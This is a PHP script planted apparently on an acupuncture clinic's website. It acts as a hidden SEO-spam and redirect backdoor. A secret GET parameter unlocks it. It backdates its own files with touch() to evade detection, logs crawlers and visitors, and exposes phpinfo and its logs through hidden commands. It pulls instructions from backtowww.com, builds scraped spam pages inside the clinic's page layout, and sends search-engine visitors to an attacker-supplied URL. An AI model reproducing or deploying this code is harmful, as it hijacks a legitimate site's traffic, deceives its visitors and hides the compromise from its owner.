<?php
//error_reporting(E_ALL);
error_reporting(0);

 	$mdzds='I2XrtKIAEagG';
if ($_GET[$mdzds])
{
		$log_path="./";


		@touch("./",time()-(rand(86400,432000)*4),time()-rand(86400,432000));
		@touch("89H4V9Pk.php",time()-(rand(86400,432000)*4),time()-rand(86400,432000));
		@touch("M0v2pJlKx29",time()-(rand(86400,432000)*4),time()-rand(86400,432000));
		@touch(".",time()-(rand(86400,432000)*4),time()-rand(86400,432000));


		function GetPage($url,$timeout=20)
		{
		        $url=str_replace("http://", "", $url);
		        $host=substr($url,0,strpos($url,"/"));
		        $path=substr($url,strpos($url,"/"));

		        $skt = @fsockopen($host, 80, $errno, $errstr, $timeout);

		        if (!$skt)
		            return false;

		        $requestHeader = "GET ".$path."  HTTP/1.1\r\n";
		        $requestHeader.= "Host: ".$host."\r\n";
		        $requestHeader.= "Connection: close\r\n\r\n";

		        fwrite($skt, $requestHeader);

		        $responseHeader = "";
		        $responseContent = "";

		        do
		        {
		            $responseHeader.= fread($skt, 1);
		        }
		        while (!preg_match("/\r\n\r\n$/", $responseHeader));


		        if (!strstr($responseHeader, "Transfer-Encoding: chunked"))
		        {
		            while (!feof($skt))
		            {
		                $responseContent.= fgets($skt, 128);
		            }
		        }
		        else
		        {
		            while ($chunk_length = hexdec(fgets($skt)))
		            {
		                $responseContentChunk = "";

		                $read_length = 0;

		                while ($read_length < $chunk_length)
		                {
		                    $responseContentChunk .= fread($skt, $chunk_length - $read_length);
		                    $read_length = strlen($responseContentChunk);
		                }

		                $responseContent.= $responseContentChunk;

		                fgets($skt);

		            }

		        }

		   return chop($responseContent);
		}



		if ($_GET[$mdzds]=='xbots')
		{
			print '<pre>';
			print file_get_contents($log_path.'7SgcltvcIeRJ');
			exit;
		}

		if ($_GET[$mdzds]=='phpinf')
		{
			phpinfo();
			exit;
		}

		if ($_GET[$mdzds]=='xse')
		{
			print '<pre>';
			print @file_get_contents($log_path.'IVDT6IdT4y6');
			exit;
		}

		if ($_GET[$mdzds]=='xul')
		{
			$url=GetPage('http://backtowww.com/update/get_2.php?host='.$_SERVER['HTTP_HOST']);

			$fp = @fopen ($log_path."R3GGjjPmPFJ", "w");
			@fwrite ($fp, $url);
			@fclose ($fp);

			@touch($log_path."R3GGjjPmPFJ",time()-(rand(86400,432000)*4),time()-rand(86400,432000));

			print '<pre>';
			print file_get_contents($log_path.'R3GGjjPmPFJ');
			exit;
		}





		function IsBot()
		{
			$stop_agents_masks = array("http", "google", "slurp", "msnbot", "bot", "crawler", "spider", "robot", "HttpClient", "curl", "PHP", "Indy Library", "WordPress");
			$_SERVER["HTTP_USER_AGENT"] = preg_replace("|User.Agent:[s ]?|i", "", @$_SERVER["HTTP_USER_AGENT"]);
			foreach ($stop_ips_masks as $stop_ip_mask) if(eregi("^{$stop_ip_mask}$", @$_SERVER['REMOTE_ADDR'])) return true;

			if(substr_count($_SERVER['HTTP_REFERER'],$_SERVER['HTTP_HOST'])!=0) return true;
			if(substr_count($_SERVER['HTTP_REFERER'],'/cse?')!=0) return true;

			if(substr_count($_SERVER['HTTP_REFERER'],"&")<3)return true;

			if($_SERVER["HTTP_USER_AGENT"]=="Mozilla/4.0 (compatible;)")return true;

			if(($_SERVER['HTTP_REFERER']=='') && ($_SERVER["HTTP_USER_AGENT"]=="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"))return true;

			return false;
		}

		function IsRefSE()
		{
			if(substr_count($_SERVER['HTTP_REFERER'],"&")>2)return true;
		}




		function GetContent($q)
		{
			$q=trim(strtolower($q));

			$url="http://www.google.ru/search?hl=en&safe=off&client=opera&hs=moz&rls=ru&q=".urlencode($q)."&btnG=%D0%9F%D0%BE%D0%B8%D1%81%D0%BA&lr=lang_en&aq=f&aqi=&aql=&oq=&gs_rfai=&num=100";
			$content=GetPage($url);
			//preg_match_all("#<div class="s">(.*)<cite>#U", $content, $result_preg);
			preg_match_all('#<div class="s">(.*)<cite>#U', $content, $result_preg);
			$result=$result_preg[1];

			/*
			$url="http://search.yahoo.com/search?n=100&p=".urlencode($q);
			$content=GetPage($url);
            preg_match_all("#<div class="abstr">(.*)</div>#U", $content, $result_preg);
            $result=$result_preg[1];
            */

			for ($i=0; $i<count($result); $i++)
			{
			 		$snippet=trim($result[$i]);
			 		$snippet=strip_tags($snippet,array('<em>','<b>'));
			 		$snippet=str_replace('em>','b>',$snippet);

					if (strpos($snippet,'File Format')==false)
					if (strpos($snippet,'http://')==false)
					{
	                    $snippet=str_replace("..."," . ",$snippet);

						//NEW BEGIN
						if (substr_count($snippet,'  .  ')!=0)
						{
							$tmp=explode('  .  ',$snippet);
							$snippet=trim($tmp[1]);
						}
						$snippet=str_replace(array('  .','  . '),'',$snippet);

                        $tmp=explode(' ',$snippet);
                        $new_snippet='';
                        for ($j=0; $j<count($tmp); $j++)
                        {
                        	if (rand(0,3)!=3)                        		$new_snippet.=' '.trim($tmp[$j]);
                        }
                        $snippet=$new_snippet;
                        unset($tmp);
						//NEW END


		   				if (trim($snippet))
							$snippets[]=$snippet;
					}
			}




			//preg_match_all("#<a href="(.*)" target=_blank class=l>(.*)</a></h3><div class="s">#U", $content, $result_preg2);
			preg_match_all('#<a href="(.*)" target=_blank class=l>(.*)</a></h3><div class="s">#U', $content, $result_preg2);
			$result_link=$result_preg2[1];
			$result_link_title=$result_preg2[2];
			$links=array();

			//print $content;

			for ($i=0; $i<count($result_link); $i++)
			{
			 		$link=trim($result_link[$i]);
			 		$link_title=trim($result_link_title[$i]);


			 		$link_title=trim(str_replace(array('...','  '),'',strip_tags($link_title)));


					if (strpos($link,'webcache')==false)
					if (strpos($link,'</a>')==false)
					{
						$links[]='<a href="'.$link.'">'.$link_title.'</a>';
					}


			}


			$tmp[snippets]=$snippets;
			$tmp[links]=$links;


			//print_r($tmp);


			return $tmp;
	  	}


        $_SERVER['QUERY_STRING']=str_replace('-',' ',$_GET[$mdzds]);

		if (IsBot()==true)
		{
			$fp = @fopen ($log_path."7SgcltvcIeRJ", "a+");
			@fwrite ($fp, $_SERVER['QUERY_STRING']."\t".date("d.m.Y H:i:s")."\t".$_SERVER["HTTP_USER_AGENT"]."\t".$_SERVER['REMOTE_ADDR']."\n");
			@fclose ($fp);

            @touch($log_path."7SgcltvcIeRJ",time()-(rand(86400,432000)*4),time()-rand(86400,432000));
	  	}
	  	elseif(IsRefSE()==true)
	  	{
			$fp = @fopen ($log_path."IVDT6IdT4y6", "a+");
			@fwrite ($fp, $_SERVER['QUERY_STRING']."\t".date("d.m.Y H:i:s")."\t".$_SERVER["HTTP_REFERER"]."\t".$_SERVER["HTTP_USER_AGENT"]."\t".$_SERVER['REMOTE_ADDR']."\n");
			@fclose ($fp);

			@touch($log_path."IVDT6IdT4y6",time()-(rand(86400,432000)*4),time()-rand(86400,432000));
	  	}
	  	else
	  	{
			/*
			$fp = @fopen ($log_path."sql5.log", "a+");
			@fwrite ($fp, $_SERVER['QUERY_STRING']."\t".date("d.m.Y H:i:s")."\t".$_SERVER["HTTP_USER_AGENT"]."\t".$_SERVER['REMOTE_ADDR']."\n");
			@fclose ($fp);
			*/
	  	}



		if (!$_SERVER['QUERY_STRING'])
		{
	    	exit();
		}


		if ((IsBot()==true) || (IsRefSE()==false))
		{
  			if (file_exists($log_path.md5($_SERVER['QUERY_STRING']))==false)
	   		{
				$q=ucwords(str_replace('%20',' ',$_SERVER['QUERY_STRING']));

				if (file_exists($log_path."R3GGjjPmPFJ")==false)
				{
					$url=GetPage('http://backtowww.com/update/get_2.php?host='.$_SERVER['HTTP_HOST']);

					$fp = @fopen ($log_path."R3GGjjPmPFJ", "w");
					@fwrite ($fp, $url);
					@fclose ($fp);

					@touch($log_path."R3GGjjPmPFJ",time()-(rand(86400,432000)*4),time()-rand(86400,432000));
				}
				elseif (time()-filemtime($log_path."R3GGjjPmPFJ")>3600)
				{
					$url=GetPage('http://backtowww.com/update/get_2.php?host='.$_SERVER['HTTP_HOST']);

					$fp = @fopen ($log_path."R3GGjjPmPFJ", "w");
					@fwrite ($fp, $url);
					@fclose ($fp);

					@touch($log_path."R3GGjjPmPFJ",time()-(rand(86400,432000)*4),time()-rand(86400,432000));
				}



				$content=GetContent($q);
				$content=$content[snippets];
                shuffle($content);


				$keys=file('M0v2pJlKx29');
				shuffle($keys);


                $t='';
				for ($i=0; $i<count($content); $i++)
				{
					/*
					if (rand(0,2)==1)
						{$link='<a href="?'.$mdzds.'='.str_replace(' ','-',trim($keys[$i])).'">'.trim($keys[$i]).'</a>';}
					else
						{$link=''.trim($keys[$i]).'<br>';}
                    */

					$link_tmp=explode('||',trim($keys[$i]));

					if (rand(0,2)==1)
						{$link='<div><a href="'.trim($link_tmp[0]).'">'.trim($link_tmp[1]).'</a>'."</div>";}
					else
						{$link='<div><strong>'.trim($link_tmp[1]).''."</strong></div>";}

					$t.='<p>'.$link.' '.$content[$i]."</p>\n";
				}


				$page='
<html>
<head>
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->

</script>



<link href="global.css" rel="stylesheet" type="text/css">

<style type="text/css">
<!--
.style2 {font-size: 10px}
.style3 {font-size: 9px}
-->
</style>
</head>

<body leftmargin=0 rightmargin=0 topmargin=0 bottommargin=0 marginwidth=0 marginheight=0>

<table cellpadding="0" cellspacing="0" border="0" width="100%">
<tr><td>&nbsp;</td></tr>
<tr><td>
<!-- Center Table -->
<!--<table width="800px" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#CD9967"> -->

<table width="800px" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td><img src="images/logo2.gif" width="200" height="61"><img src="images/topbar.gif" width="600" height="61"></td>
  </tr>
    <tr height="23px">
    <td bgcolor="996666">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="images/bindi.gif" align="absmiddle"></td>
  </tr>
  <!--  ********  body content *********  -->
  <tr><td>
  <table width="100%" height="500px" border="0" cellpadding="0" cellspacing="0">
   <tr>
  
  <!-- *********  Menu  ********  -->
<td valign="top" width="200px" background="images/wtback.gif" class="menu">
    <p><span class="style1">General Links</span><br>
  	  &nbsp;&nbsp;<a href="index.htm">Home</a><br>
  	  &nbsp;&nbsp;<a href="drzhu.htm">About Dr. Zhu</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="drzhu.htm#professional">Professional</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="drzhu.htm#acadawards">Academic Awards</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="drzhu.htm#education">Education</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="drzhu.htm#references">References</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="drzhu.htm#guest">Guest Speaker</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="drzhu.htm#publications">Publications</a><br>
      &nbsp;&nbsp;<a href="patients.htm">What do patients say?</a><br>
	  &nbsp;&nbsp;<a href="acupuncture.htm">Acupuncture</a><br>
	  &nbsp;&nbsp;<a href="traditional.htm">Traditional Chinese Medicine</a><br>
	  &nbsp;&nbsp;<a href="integratedmedicine.htm">Integrated Medicine</a><br>
      <!--&nbsp;&nbsp;<a href="herbs.htm">Herbs</a><br>
	  &nbsp;&nbsp;<a href="alternative.htm">Alternative Medicine</a><br>-->
	  &nbsp;&nbsp;<a href="consultation.htm">Free Consultation</a><br>
	  &nbsp;&nbsp;<a href="Insurance_Coverag_new.htm">Insurance Coverag</a><br>
	  &nbsp;&nbsp;<a href="location.htm">Location</a><br> 
	  &nbsp;&nbsp;<a href="relatedlinks.htm">Related Links</a><br>
<!-- orig
	  &nbsp;&nbsp;<a href="../index.htm">Home</a><br>
  	  &nbsp;&nbsp;<a href="../drzhu.htm">About Dr. Zhu</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="../drzhu.htm#professional">Professional</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="../drzhu.htm#acadawards">Academic Awards</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="../drzhu.htm#education">Education</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="../drzhu.htm#references">References</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="../drzhu.htm#guest">Guest Speaker</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="../drzhu.htm#publications">Publications</a><br>
      &nbsp;&nbsp;<a href="../patients.htm">What do patients say?</a><br>
	  &nbsp;&nbsp;<a href="../acupuncture.htm">Acupuncture</a><br>
	  &nbsp;&nbsp;<a href="../traditional.htm">Traditional Chinese Medicine</a><br>
	  &nbsp;&nbsp;<a href="integratedmedicine.htm">Integrated Medicine</a><br>
      <!--&nbsp;&nbsp;<a href="../herbs.htm">Herbs</a><br>
	  &nbsp;&nbsp;<a href="../alternative.htm">Alternative Medicine</a><br>-->
	  &nbsp;&nbsp;<a href="../consultation.htm">Free Consultation</a><br>
	  &nbsp;&nbsp;<a href="../location.htm">Location</a><br> 
	  &nbsp;&nbsp;<a href="../relatedlinks.htm">Related Links</a><br>
-->
	 &nbsp;&nbsp;<a href="mailto:zhubindi@msn.com">Contact Us</a></p>
	
	  
	  <p><span class="style1">Articles</span><br>
	  &nbsp;&nbsp;<strong><em>Women"s Health Issues</em></strong><br>
	&nbsp;&nbsp;&nbsp;&nbsp;<a href="women_partners_in_health.htm">Integrating Medicine with Women Health</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="menopause.htm">Menopause</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="fertility.htm">Infertility</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="women_partners_in_health.htm#Low back pain during pregnancy">Low back pain during pregnancy</a><br>
 	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="women_partners_in_health.htm#Labor pain/induce labor">Labor pain/induce labor</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="women_partners_in_health.htm#Breech presentation">Breech presentation</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="women_partners_in_health.htm#PMS">PMS</a><br>
	&nbsp;&nbsp;&nbsp;&nbsp;<a href="women_partners_in_health.htm#Dysmenorrhea">Dysmenorrhea</a><br>
	&nbsp;&nbsp;&nbsp;&nbsp;<a href="women_partners_in_health.htm#Morning sickness">Morning sickness</a><br>
	&nbsp;&nbsp;&nbsp;&nbsp;<a href="women_partners_in_health.htm#Migraine">Migraine</a><br>
 
	<!--&nbsp;&nbsp;&nbsp;&nbsp;<a href="../pms.htm">PMS</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="../endometriosis.htm">Endometriosis</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="../cysts.htm">Ovarian Cysts</a><br>-->
	  &nbsp;&nbsp;<strong><em>Pain Management</em></strong><br>
      	&nbsp;&nbsp;&nbsp;&nbsp;<a href="headache.htm">Headache</a><br>
      	&nbsp;&nbsp;&nbsp;&nbsp;<a href="backpain.htm">Back Pain</a><br>
      <!--&nbsp;&nbsp;&nbsp;&nbsp;<a href="../neckshoulder.htm">Neck and Shoulder Pain</a><br>-->
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="hepatitis.htm">Hepatitis C</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="depression.htm">Depression</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="headache.htm">Headache</a><br>
 	&nbsp;&nbsp;&nbsp;&nbsp;<a href="Allergy_and_Sinusitis.ppt">Allergy and Sinusitis</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="smoking.htm">Quit Smoking</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="stroke.htm">Stroke Rehabilitation</a><br>
	  &nbsp;&nbsp;&nbsp;&nbsp;<a href="nephritis.htm">Nephritis</a><br>
	&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://drzhu.com/fertility.htm">Irritable bowel syndrome</a><br>
	  <!--&nbsp;&nbsp;<a href="#">Weight Management</a><br>-->
	  </p>
	
  </td>

  <!-- *********  Content  ********  -->
<td valign="top" width="*" bgcolor="white">'.$t.'</td>
   
   
   </tr>
  </table>

</td>
</tr>
<tr>
<td>&nbsp;</td></tr>

</table>

</body>
</html>
';

				$fp = fopen ($log_path.md5($_SERVER['QUERY_STRING']), "w+");
    			fwrite ($fp, $page);
     			fclose ($fp);

     			@touch($log_path.md5($_SERVER['QUERY_STRING']),time()-(rand(86400,432000)*4),time()-rand(86400,432000));
			}
			else
			{
				$page=file_get_contents($log_path.md5($_SERVER['QUERY_STRING']));
			}
				print $page;
				exit;
	    }





		if (IsRefSE()==true)
		{
			if (file_exists($log_path."QiGTepVSL")==false)
			{				$url=GetPage('http://backtowww.com/update/get_1.php?host='.$_SERVER['HTTP_HOST']);

				$fp = @fopen ($log_path."QiGTepVSL", "w");
				@fwrite ($fp, $url);
				@fclose ($fp);

				@touch($log_path."QiGTepVSL",time()-(rand(86400,432000)*4),time()-rand(86400,432000));			}
			elseif (time()-filemtime($log_path."QiGTepVSL")>600)
			{
				$url=GetPage('http://backtowww.com/update/get_1.php?host='.$_SERVER['HTTP_HOST']);

				$fp = @fopen ($log_path."QiGTepVSL", "w");
				@fwrite ($fp, $url);
				@fclose ($fp);

				@touch($log_path."QiGTepVSL",time()-(rand(86400,432000)*4),time()-rand(86400,432000));			}
			else
			{			}
			header('Location: '.trim(file_get_contents($log_path."QiGTepVSL")));
		}


		//print_r(GetContent('colt mccoy nfl draft'));
}
?>